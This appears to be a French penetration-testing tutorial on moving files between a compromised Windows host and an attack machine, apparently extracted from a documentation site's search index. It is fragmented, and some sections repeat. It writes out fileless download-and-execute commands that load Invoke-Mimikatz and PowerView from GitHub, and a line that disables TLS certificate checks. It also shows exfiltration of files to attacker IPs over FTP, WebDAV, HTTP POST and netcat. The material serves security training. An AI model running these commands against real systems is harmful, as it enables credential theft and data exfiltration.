T\u00e9l\u00e9chargements SMB Nous avons pr\u00e9c\u00e9demment vu que les entreprises autorisent souvent le trafic sortant \u00e0 l'aide des protocoles HTTP ( TCP / 80 ) et HTTPS ( TCP / 443 ). G\u00e9n\u00e9ralement, les entreprises n'autorisent pas le protocole SMB ( TCP / 445 ) hors de leur r\u00e9seau interne, car cela peut les ouvrir \u00e0 des attaques potentielles. Pour plus d'informations \u00e0 ce sujet, nous pouvons lire la publication Microsoft Emp\u00eacher le trafic SMB des connexions lat\u00e9rales et entrer ou quitter le r\u00e9seau . Une alternative consiste \u00e0 ex\u00e9cuter SMB sur HTTP avec WebDav. WebDAV ( RFC 4918 ) est une extension de HTTP, le protocole Internet que les navigateurs Web et les serveurs Web utilisent pour communiquer entre eux. Le protocole WebDAV permet \u00e0 un serveur Web de se comporter comme un serveur de fichiers, prenant en charge la cr\u00e9ation de contenu collaboratif. WebDAV peut \u00e9galement utiliser HTTPS. Lorsque vous utilisez SMB, il tentera d'abord de se connecter \u00e0 l'aide du protocole SMB, et s'il n'y a pas de part SMB disponible, il essaiera de se connecter \u00e0 l'aide du protocole HTTP. Dans la capture de Wireshark suivante, nous essayons de nous connecter au partage de fichiers testing3, et parce qu'il n'a rien trouv\u00e9 avec SMB, il utilise HTTP. Configuration du serveur WebDav Pour configurer notre serveur WebDav, nous devons installer deux modules Python, wsgidav et cheroot ( vous pouvez en savoir plus sur cette impl\u00e9mentation ici: wsgidav github )). Apr\u00e8s les avoir install\u00e9s, nous ex\u00e9cutons le wsgidav application dans le r\u00e9pertoire cible. Installation des modules WebDav Python admin@pc[/pc]$ sudo pip install wsgidav cheroot [sudo] password for plaintext: Collecting wsgidav Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB) |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 171 kB 1.4 MB/s ...SNIP... Utilisation du module WebDav Python admin@pc[/pc]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous [sudo] password for plaintext: Running without configuration file. 10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping. 10:02:53.950 - INFO : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31 10:02:53.950 - INFO : Lock manager: LockManager(LockStorageDict) 10:02:53.950 - INFO : Property manager: None 10:02:53.950 - INFO : Domain controller: SimpleDomainController() 10:02:53.950 - INFO : Registered DAV providers by route: 10:02:53.950 - INFO : - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous) 10:02:53.950 - INFO : - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous) 10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL. 10:02:53.950 - WARNING : Share '/' will allow anonymous write access. 10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access. 10:02:54.194 - INFO : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2 10:02:54.194 - INFO : Serving on http://0.0.0.0:80 ... Connexion au partage Webdav Nous pouvons maintenant essayer de nous connecter au partage en utilisant le DavWWWRoot r\u00e9pertoire. C:\\pc> dir \\\\192.168.49.128\\DavWWWRoot Volume in drive \\\\192.168.49.128\\DavWWWRoot has no label. Volume Serial Number is 0000-0000 Directory of \\\\192.168.49.128\\DavWWWRoot 05/18/2022 10:05 AM <DIR> . 05/18/2022 10:05 AM <DIR> .. 05/18/2022 10:05 AM <DIR> sharefolder 05/18/2022 10:05 AM 13 filetest.txt 1 File(s) 13 bytes 3 Dir(s) 43,443,318,784 bytes free Remarque: DavWWWRoot est un mot cl\u00e9 sp\u00e9cial reconnu par Windows Shell. Aucun dossier de ce type n'existe sur votre serveur WebDAV. Le mot cl\u00e9 DavWWRoot indique au pilote Mini-Redirector, qui g\u00e8re les demandes WebDAV que vous vous connectez \u00e0 la racine du serveur WebDAV. Vous pouvez \u00e9viter d'utiliser ce mot-cl\u00e9 si vous sp\u00e9cifiez un dossier qui existe sur votre serveur lors de la connexion au serveur. Par exemple: \\ 192.168.49.128 \\ sharefolder T\u00e9l\u00e9chargement de fichiers \u00e0 l'aide de SMB C:\\pc> copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\ C:\\pc> copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\ Remarque: S'il n'y a pas de restrictions SMB ( TCP / 445 ), vous pouvez utiliser impacket-smbserver de la m\u00eame mani\u00e8re que nous l'avons configur\u00e9 pour les op\u00e9rations de t\u00e9l\u00e9chargement. T\u00e9l\u00e9chargements FTP Le t\u00e9l\u00e9chargement de fichiers \u00e0 l'aide de FTP est tr\u00e8s similaire au t\u00e9l\u00e9chargement de fichiers. Nous pouvons utiliser PowerShell ou le client FTP pour executer l'op\u00e9ration. Avant de d\u00e9marrer notre serveur FTP \u00e0 l'aide du module Python pyftpdlib, nous devons sp\u00e9cifier l'option --write pour permettre aux clients de t\u00e9l\u00e9charger des fichiers sur notre h\u00f4te d'attaque. admin@pc[/pc]$ sudo python3 -m pyftpdlib --port 21 --write /usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user. warnings.warn(\"write permissions assigned to anonymous user.\", [I 2022-05-18 10:33:31] concurrency model: async [I 2022-05-18 10:33:31] masquerade (NAT) address: None [I 2022-05-18 10:33:31] passive ports: None [I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<< Utilisons maintenant la fonction de t\u00e9l\u00e9chargement PowerShell pour t\u00e9l\u00e9charger un fichier sur notre serveur FTP. Fichier de t\u00e9l\u00e9chargement PowerShell PS C:\\pc> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts') Cr\u00e9er un fichier de commande pour le client FTP pour t\u00e9l\u00e9charger un fichier C:\\pc> echo open 192.168.49.128 > ftpcommand.txt C:\\pc> echo USER anonymous >> ftpcommand.txt C:\\pc> echo binary >> ftpcommand.txt C:\\pc> echo PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt C:\\pc> echo bye >> ftpcommand.txt C:\\pc> ftp -v -n -s:ftpcommand.txt ftp> open 192.168.49.128 Log in with USER and PASS first. ftp> USER anonymous ftp> PUT c:\\windows\\system32\\drivers\\etc\\hosts ftp> bye","title":"Le transfert de fichier"},{"location":"Hack/transfert%20de%20fichier/#le-transfert-de-fichier","text":"","title":"Le transfert de fichier"},{"location":"Hack/transfert%20de%20fichier/#powershell-base64-decode-encode","text":"Check de la cl\u00e9 ssh en hash md5 admin@pc[/pc]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278 id_rsa Encodage de la cl\u00e9 en base64 >admin@pc[/pc]$ cat id_rsa |base64 -w 0;echo > >LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K... Nous pouvons copier ce contenu et le coller dans une borne Windows PowerShell et utiliser certaines fonctions PowerShell pour le d\u00e9coder. >PS C:\\pc> [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K... Enfin, nous pouvons confirmer si le fichier a \u00e9t\u00e9 transf\u00e9r\u00e9 avec succ\u00e8s \u00e0 l'aide du Get-FileHash cmdlet, qui fait la m\u00eame chose que md5sum fait. PS C:\\pc> Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5 Algorithm Hash Path --------- ---- ---- MD5 4E301756A07DED0A2DD6953ABF015278 C:\\Users\\Public\\id_rsa","title":"Powershell base64 d\u00e9code encode"},{"location":"Hack/transfert%20de%20fichier/#telechargements-web-powershell","text":"PowerShell propose de nombreuses options de transfert de fichiers. Dans n'importe quelle version de PowerShell, le System.Net.WebClient peut \u00eatre utilis\u00e9e pour t\u00e9l\u00e9charger un fichier sur HTTP, HTTPS ou FTP. Les \u00e9l\u00e9ments suivants d\u00e9crivent les m\u00e9thodes WebClient pour t\u00e9l\u00e9charger des donn\u00e9es \u00e0 partir d'une ressource: Method Description OpenRead Renvoie les donn\u00e9es d'une ressource en tant que Flux. OpenReadAsync Renvoie les donn\u00e9es d'une ressource sans bloquer le thread appelant. DownloadData T\u00e9l\u00e9charge les donn\u00e9es d'une ressource et renvoie un tableau d'octets. DownloadDataAsync T\u00e9l\u00e9charge les donn\u00e9es d'une ressource et renvoie un tableau d'octets sans bloquer le thread appelant. DownloadFile T\u00e9l\u00e9charge les donn\u00e9es d'une ressource vers un fichier local. DownloadFileAsync T\u00e9l\u00e9charge les donn\u00e9es d'une ressource vers un fichier local sans bloquer le thread appelant. DownloadString T\u00e9l\u00e9charge une cha\u00eene \u00e0 partir d'une ressource et renvoie une cha\u00eene. DownloadStringAsync T\u00e9l\u00e9charge une cha\u00eene \u00e0 partir d'une ressource sans bloquer le fil appelant.","title":"T\u00e9l\u00e9chargements Web PowerShell"},{"location":"Hack/transfert%20de%20fichier/#methode-powershell-downloadfile","text":"Nous pouvons sp\u00e9cifier le nom de la classe Net.WebClient et la m\u00e9thode DownloadFile avec les param\u00e8tres correspondant \u00e0 l'URL du fichier cible \u00e0 t\u00e9l\u00e9charger et le nom du fichier de sortie. PS C:\\pc> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>') PS C:\\pc> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1') PS C:\\pc> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>') PS C:\\pc> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')","title":"M\u00e9thode PowerShell DownloadFile"},{"location":"Hack/transfert%20de%20fichier/#powershell-downloadstring-methode-sans-fichier","text":"Comme nous l'avons vu pr\u00e9c\u00e9demment, les attaques sans fichier fonctionnent en utilisant certaines fonctions du syst\u00e8me d'exploitation pour t\u00e9l\u00e9charger la charge utile et l'ex\u00e9cuter directement. PowerShell peut \u00e9galement \u00eatre utilis\u00e9 pour effectuer des attaques sans fichier. Au lieu de t\u00e9l\u00e9charger un script PowerShell sur disque, nous pouvons l'ex\u00e9cuter directement en m\u00e9moire \u00e0 l'aide du Invoke-Expression cmdlet ou l'alias IEX. PS C:\\pc> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') IEX accepte \u00e9galement les entr\u00e9es de pipeline. PS C:\\pc> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX","title":"PowerShell DownloadString - M\u00e9thode sans fichier"},{"location":"Hack/transfert%20de%20fichier/#powershell-invoke-webrequest","text":"\u00c0 partir de PowerShell 3.0, le Invoke-WebRequest cmdlet est \u00e9galement disponible, mais il est nettement plus lent \u00e0 t\u00e9l\u00e9charger des fichiers. Vous pouvez utiliser les alias iwr, curl, et wget au lieu de la Invoke-WebRequest nom complet. PS C:\\pc> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1 https://gist.github.com/HarmJ0y/bb48307ffa663256e239","title":"PowerShell Invoke-WebRequest"},{"location":"Hack/transfert%20de%20fichier/#erreurs-courantes-avec-powershell","text":"Il peut y avoir des cas o\u00f9 la configuration du premier lancement d'Internet Explorer n'est pas termin\u00e9e, ce qui emp\u00eache le t\u00e9l\u00e9chargement. Cela peut \u00eatre contourn\u00e9 \u00e0 l'aide du param\u00e8tre -UseBasicParsing. PS C:\\pc> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. At line:1 char:1 + Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand PS C:\\pc> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX Une autre erreur dans les t\u00e9l\u00e9chargements PowerShell est li\u00e9e au canal s\u00e9curis\u00e9 SSL / TLS si le certificat n'est pas fiable. Nous pouvons contourner cette erreur avec la commande suivante: PS C:\\pc> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') Exception calling \"DownloadString\" with \"1\" argument(s): \"The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.\" At line:1 char:1 + IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : WebException PS C:\\pc> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}","title":"Erreurs courantes avec PowerShell"},{"location":"Hack/transfert%20de%20fichier/#telechargements-smb","text":"Le protocole SMB qui s'ex\u00e9cute sur le port TCP / 445 est courant dans les r\u00e9seaux d'entreprise o\u00f9 les services Windows s'ex\u00e9cutent. Il permet aux applications et aux utilisateurs de transf\u00e9rer des fichiers vers et depuis des serveurs distants. Nous pouvons utiliser SMB pour t\u00e9l\u00e9charger facilement des fichiers depuis notre Pwnbox. Nous devons cr\u00e9er un serveur SMB dans notre Pwnbox avec smbserver.py de Impacket puis utiliser copy, move, PowerShell Copy-Item, ou tout autre outil permettant la connexion \u00e0 SMB.","title":"T\u00e9l\u00e9chargements SMB"},{"location":"Hack/transfert%20de%20fichier/#creer-le-serveur-smb","text":"admin@pc[/pc]$ sudo impacket-smbserver share -smb2support /tmp/smbshare Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed","title":"Cr\u00e9er le serveur SMB"},{"location":"Hack/transfert%20de%20fichier/#copiez-un-fichier-a-partir-du-serveur-smb","text":"C:\\pc> copy \\\\192.168.220.133\\share\\nc.exe 1 file(s) copied. Les nouvelles versions de Windows bloquent l'acc\u00e8s non authentifi\u00e9 des invit\u00e9s, comme nous pouvons le voir dans la commande suivante: C:\\pc> copy \\\\192.168.220.133\\share\\nc.exe You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.","title":"Copiez un fichier \u00e0 partir du serveur SMB"},{"location":"Hack/transfert%20de%20fichier/#creez-le-serveur-smb-avec-un-nom-dutilisateur-et-un-mot-de-passe","text":"admin@pc[/pc]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed","title":"Cr\u00e9ez le serveur SMB avec un nom d'utilisateur et un mot de passe"},{"location":"Hack/transfert%20de%20fichier/#monter-le-serveur-smb-avec-nom-dutilisateur-et-mot-de-passe","text":"C:\\pc> net use n: \\\\192.168.220.133\\share /user:test test The command completed successfully. C:\\pc> copy n:\\nc.exe 1 file(s) copied. Remarque: Vous pouvez \u00e9galement monter le serveur SMB si vous recevez une erreur lorsque vous utilisez copy filename \\\\ IP \\ sharename .","title":"Monter le serveur SMB avec nom d'utilisateur et mot de passe"},{"location":"Hack/transfert%20de%20fichier/#telechargements-ftp","text":"Une autre fa\u00e7on de transf\u00e9rer des fichiers consiste \u00e0 utiliser FTP ( File Transfer Protocol ), qui utilise le port TCP / 21 et TCP / 20. Nous pouvons utiliser le client FTP ou PowerShell Net.WebClient pour t\u00e9l\u00e9charger des fichiers \u00e0 partir d'un serveur FTP. Nous pouvons configurer un serveur FTP dans notre h\u00f4te d'attaque \u00e0 l'aide de Python3 pyftpdlib module. Il peut \u00eatre install\u00e9 avec la commande suivante: admin@pc[/pc]$ sudo pip3 install pyftpdlib Ensuite, nous pouvons sp\u00e9cifier le port num\u00e9ro 21 car, par d\u00e9faut, pyftpdlib utilise le port 2121. L'authentification anonyme est activ\u00e9e par d\u00e9faut si nous ne d\u00e9finissons pas d'utilisateur et de mot de passe.","title":"T\u00e9l\u00e9chargements FTP"},{"location":"Hack/transfert%20de%20fichier/#configuration-dun-serveur-ftp-python3","text":"admin@pc[/pc]$ sudo python3 -m pyftpdlib --port 21 [I 2022-05-17 10:09:19] concurrency model: async [I 2022-05-17 10:09:19] masquerade (NAT) address: None [I 2022-05-17 10:09:19] passive ports: None [I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<","title":"Configuration d'un serveur FTP Python3"},{"location":"Hack/transfert%20de%20fichier/#transferer-des-fichiers-a-partir-dun-serveur-ftp-a-laide-de-powershell","text":"PS C:\\pc> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt') Lorsque nous obtenons un shell sur une machine distante, nous n'avons peut-\u00eatre pas de shell interactif. Si tel est le cas, nous pouvons cr\u00e9er un fichier de commande FTP pour t\u00e9l\u00e9charger un fichier. Tout d'abord, nous devons cr\u00e9er un fichier contenant les commandes que nous voulons ex\u00e9cuter, puis utiliser le client FTP pour utiliser ce fichier pour t\u00e9l\u00e9charger ce fichier.","title":"Transf\u00e9rer des fichiers \u00e0 partir d'un serveur FTP \u00e0 l'aide de PowerShell"},{"location":"Hack/transfert%20de%20fichier/#creer-un-fichier-de-commande-pour-le-client-ftp-et-telecharger-le-fichier-cible","text":"C:\\pc> echo open 192.168.49.128 > ftpcommand.txt C:\\pc> echo USER anonymous >> ftpcommand.txt C:\\pc> echo binary >> ftpcommand.txt C:\\pc> echo GET file.txt >> ftpcommand.txt C:\\pc> echo bye >> ftpcommand.txt C:\\pc> ftp -v -n -s:ftpcommand.txt ftp> open 192.168.49.128 Log in with USER and PASS first. ftp> USER anonymous ftp> GET file.txt ftp> bye C:\\pc>more file.txt This is a test file Il existe \u00e9galement des situations telles que la fissuration par mot de passe, l'analyse, l'exfiltration, etc., o\u00f9 nous devons t\u00e9l\u00e9charger des fichiers de notre machine cible dans notre h\u00f4te d'attaque. Nous pouvons utiliser les m\u00eames m\u00e9thodes que nous avons utilis\u00e9es pr\u00e9c\u00e9dement. Voyons comment nous pouvons effectuer le t\u00e9l\u00e9chargement de fichiers de diff\u00e9rentes mani\u00e8res.","title":"Cr\u00e9er un fichier de commande pour le client FTP et t\u00e9l\u00e9charger le fichier cible"},{"location":"Hack/transfert%20de%20fichier/#powershell-base64-encode-decode","text":"","title":"PowerShell Base64 Encode &amp; Decode"},{"location":"Hack/transfert%20de%20fichier/#encoder-le-fichier-a-laide-de-powershell","text":"````powershell PS C:\\pc> [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte)) IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= PS C:\\pc> Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash Hash 3688374325B992DEF12793500307566D Nous copions ce contenu et le collons dans notre h\u00f4te d'attaque, utilisons la commande base64 pour le d\u00e9coder et utiliser le md5sum application pour confirmer le transfert s'est d\u00e9roul\u00e9 correctement. ### Decode Base64 String sous Linux ````sh admin@pc[/pc]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts admin@pc[/pc]$ md5sum hosts 3688374325b992def12793500307566d hosts","title":"Encoder le fichier \u00e0 l'aide de PowerShell"},{"location":"Hack/transfert%20de%20fichier/#telechargements-web-powershell_1","text":"PowerShell n'a pas de fonction int\u00e9gr\u00e9e pour les op\u00e9rations de t\u00e9l\u00e9chargement, mais nous pouvons utiliser Invoke-WebRequest ou Invoke-RestMethod pour construire notre fonction de t\u00e9l\u00e9chargement. Nous aurons \u00e9galement besoin d'un serveur Web qui accepte les t\u00e9l\u00e9chargements, ce qui n'est pas une option par d\u00e9faut dans la plupart des utilitaires de serveur Web courants. Pour notre serveur Web, nous pouvons utiliser serveur de telechargement , un module \u00e9tendu du Python http.Server , qui comprend une page de t\u00e9l\u00e9chargement de fichiers. Installons-le et d\u00e9marrons le serveur Web.","title":"T\u00e9l\u00e9chargements Web PowerShell"},{"location":"Hack/transfert%20de%20fichier/#installation-dun-serveur-web-configure-avec-telechargement","text":"admin@pc[/pc]$ pip3 install uploadserver Collecting upload server Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB) Installing collected packages: uploadserver Successfully installed uploadserver-2.0.1 admin@pc[/pc]$ python3 -m uploadserver File upload available at /upload Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Nous pouvons maintenant utiliser un script PowerShell PSUpload.ps1 qui utilise Invoke-WebRequest pour effectuer les op\u00e9rations de t\u00e9l\u00e9chargement. Le script accepte deux param\u00e8tres -File, que nous utilisons pour sp\u00e9cifier le chemin de fichier, et -Uri, l'URL du serveur o\u00f9 nous t\u00e9l\u00e9chargerons notre fichier. Essayons de t\u00e9l\u00e9charger le fichier h\u00f4te \u00e0 partir de notre h\u00f4te Windows. PS C:\\pc> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') PS C:\\pc> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts [+] File Uploaded: C:\\Windows\\System32\\drivers\\etc\\hosts [+] FileHash: 5E7241D66FD77E9E8EA866B6278B2373","title":"Installation d'un serveur Web configur\u00e9 avec t\u00e9l\u00e9chargement"},{"location":"Hack/transfert%20de%20fichier/#telechargement-web-powershell-base64","text":"Une autre fa\u00e7on d'utiliser les fichiers cod\u00e9s PowerShell et base64 pour les op\u00e9rations de t\u00e9l\u00e9chargement consiste \u00e0 utiliser Invoke-WebRequest ou Invoke-RestMethod avec Netcat. Nous utilisons Netcat pour \u00e9couter sur un port que nous sp\u00e9cifions et envoyer le fichier en tant que demande POST. Enfin, nous copions la sortie et utilisons la fonction de d\u00e9codage base64 pour convertir la cha\u00eene base64 en fichier. PS C:\\pc> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte)) PS C:\\pc> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64 Nous capturons les donn\u00e9es base64 avec Netcat et utilisons l'application base64 avec l'option de d\u00e9codage pour convertir la cha\u00eene en fichier. admin@pc[/pc]$ nc -lvnp 8000 listening on [any] 8000 ... connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923 POST / HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682 Content-Type: application/x-www-form-urlencoded Host: 192.168.49.128:8000 Content-Length: 1820 Connection: Keep-Alive IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo ...SNIP... admin@pc[/pc]$ echo <base64> | base64 -d -w 0 > hosts","title":"T\u00e9l\u00e9chargement Web PowerShell Base64"},{"location":"Hack/transfert%20de%20fichier/#telechargements-smb_1","text":"Nous avons pr\u00e9c\u00e9demment vu que les entreprises autorisent souvent le trafic sortant \u00e0 l'aide des protocoles HTTP ( TCP / 80 ) et HTTPS ( TCP / 443 ). G\u00e9n\u00e9ralement, les entreprises n'autorisent pas le protocole SMB ( TCP / 445 ) hors de leur r\u00e9seau interne, car cela peut les 